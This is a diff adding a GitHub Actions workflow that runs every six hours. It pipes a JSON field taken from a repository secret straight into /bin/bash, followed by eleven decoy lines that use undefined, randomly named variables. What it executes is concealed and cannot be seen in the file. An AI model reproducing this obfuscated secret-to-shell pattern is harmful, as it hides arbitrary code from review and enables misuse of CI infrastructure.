@@ -1,0 +1,29 @@
+name: qunxianxinhuang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qunxianxinhuang
+        env:
+          i3: ${{ secrets.i3 }}
+        run: |
+          echo $i3 | jq -r .ozttx70557 | /bin/bash
+          echo $xo6 | jq -r .wf8 | /bin/bash
+          echo $wk7 | jq -r .ivxh7 | /bin/bash
+          echo $lyel765 | jq -r .vkyp33 | /bin/bash
+          echo $rltba5 | jq -r .gafoj992 | /bin/bash
+          echo $b97352 | jq -r .lhshc58 | /bin/bash
+          echo $cv59534 | jq -r .hs69961 | /bin/bash
+          echo $qrrnl07 | jq -r .kqda038 | /bin/bash
+          echo $rw8 | jq -r .hq926 | /bin/bash
+          echo $zhd2074 | jq -r .dzaw6 | /bin/bash
+          echo $yxq3969 | jq -r .wkti07 | /bin/bash
+          echo $llpmr52632 | jq -r .efi6427 | /bin/bash
+
